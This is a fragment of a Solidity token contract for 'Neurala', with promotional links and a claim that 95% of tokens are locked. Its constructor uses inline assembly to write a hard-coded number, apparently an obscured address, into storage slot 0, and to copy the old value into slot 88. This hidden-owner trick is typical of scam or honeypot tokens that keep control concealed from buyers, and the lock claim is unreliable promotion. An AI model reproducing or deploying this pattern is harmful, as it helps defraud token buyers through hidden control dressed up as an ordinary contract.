/*
Welcome to Neurala Crypto WORLD!

Telegram: https://t.me/Neurala/
Twitter: https://twitter.com/Neurala/
Website: https://Neurala.crypto
95% of tokens - LOCKED!
...
contract Neurala {
    string public constant name = "Neurala";
    string public constant symbol = "NLAAIgenius";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, 31211914532542553970810242954063951347870353222)}
